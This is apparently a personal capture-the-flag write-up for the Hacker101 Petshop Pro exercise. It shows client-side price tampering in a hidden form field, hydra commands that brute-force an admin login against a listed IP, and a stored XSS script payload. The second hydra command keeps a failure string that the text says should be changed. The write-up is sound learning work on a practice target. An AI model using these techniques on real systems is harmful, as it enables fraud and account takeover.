# FLAG 0
FLAG 0 Started with the clue 
```
Something looks out of place with checkout
```
Since I was going to checkout I added one item to my cart and went to the checkout.


When you inspect the source code of the checkout page it is instantly clear that you can **manipulate the price input**

**BEFORE EDIT**
```html
<!doctype html>
<html>
	<head>
		<title>Petshop Pro &mdash; Cart</title>
	</head>
	<body>
		<h1>Shopping Cart</h1>
		<table>
			<tr>
				<th>Price</th>
				<th>Name</th>
				<th>Description</th>
			</tr>
			
			<tr>
				<td>$8.95</td>
				<td>Kitten</td>
				<td>8"x10" color glossy photograph of a kitten.</td>
			</tr>
			
			<tr>
				<td>$8.95</td>
				<td>Kitten</td>
				<td>8"x10" color glossy photograph of a kitten.</td>
			</tr>
			
		</table>
		<p><b>Total: $17.9</b></p>
		<form action="checkout" method="POST">
			<input type="hidden" name="cart" value="[[0, {&#34;logo&#34;: &#34;kitten.jpg&#34;, &#34;price&#34;: 8.95, &#34;name&#34;: &#34;Kitten&#34;, &#34;desc&#34;: &#34;8\&#34;x10\&#34; color glossy photograph of a kitten.&#34;}], [0, {&#34;logo&#34;: &#34;kitten.jpg&#34;, &#34;price&#34;: 8.95, &#34;name&#34;: &#34;Kitten&#34;, &#34;desc&#34;: &#34;8\&#34;x10\&#34; color glossy photograph of a kitten.&#34;}]]">
			<p><input type="submit" value="Check Out"></p>
		</form>
	</body>
</html> 
```

**Edited line**
```html
<form action="checkout" method="POST">
			<input type="hidden" name="cart" value="[[0, {&#34;logo&#34;: &#34;kitten.jpg&#34;, &#34;price&#34;: 0, &#34;name&#34;: &#34;Kitten&#34;, &#34;desc&#34;: &#34;8\&#34;x10\&#34; color glossy photograph of a kitten.&#34;}], [0, {&#34;logo&#34;: &#34;kitten.jpg&#34;, &#34;price&#34;: 0, &#34;name&#34;: &#34;Kitten&#34;, &#34;desc&#34;: &#34;8\&#34;x10\&#34; color glossy photograph of a kitten.&#34;}]]">
			<p><input type="submit" value="Check Out"></p>
		</form>
```
If you change the price of the item to 0 and hit checkout you will get the first flag.

# FLAG 1
Finding flag 1 took alot of time and research mostly learning how wordlists and hydra works.

I began with the clue 
```
There must be a way to administer the app
```
This pointed me towards finding a login page. I tried /admin , /manage and then eventually /login which was correct.

Once on the login page I tried the method of entering special characters to try an SQL injection but this was not the way to continue.

At this point I was stuck for ideas and took the second hint.
```
Tools may help you find the entrypoint
```
That is when I got onto the null-byte forum and found out about **brute force attacks**. With this new found knowledge I began researching brute force tools and found I already had hydra installed on my VM

After abit of reading of the help screen I got to the command
```shell
hydra 35.190.155.168 -L /home/ewan/Desktop/wordlists/rockyou.txt -p pass  http-post-form "/aadcaf10f3/login:username=^USER^&password=^PASS^:Invalid username" -t 64
```
This will use a wordlist to do a dictionary attack againest the login form. When it doesn't detect the "Invalid username" message on the screen that means the username is correct.

It found the username 'livvy' to be correct.

After this i just did the same thing but used -l livvy and -P wordlist instead to search for the correct password.

Its important to change the ending variable to 'Invalid Password' instead of username or the search will fail.

```
hydra 35.190.155.168 -l livvy -P /home/ewan/Desktop/wordlists/pass.txt  http-post-form "/aadcaf10f3/login:username=livvy&password=^PASS^:Invalid username" -t 64 
```

That gave the password samantha

Once the details are entered you get the flag

# FLAG 2
Flag 2 I found pretty easily. Once I had admin access I went to the edit page and started to mess with the fields mostly the name of item one.

I entered `<h1>foobar</h1>` and saved when returning to home it showed the heading this showed that it was executing HTML code when it shouldn't be and this could be exploited.

At this point I went back to the hacker101 video resources and researched XSS exploitation. Eventually I entered
```
<script>alert(1);</script>
```
into the name box and saved.

When returning to the home page the alert box appeared. No flag appeared so I was abit confused but once i went to the checkout and it appeared again and when I interacted with it the flags appeared.

# Conclusion
Overall another fun CTF learned alot about hydra and consolidated what I knew about XSS

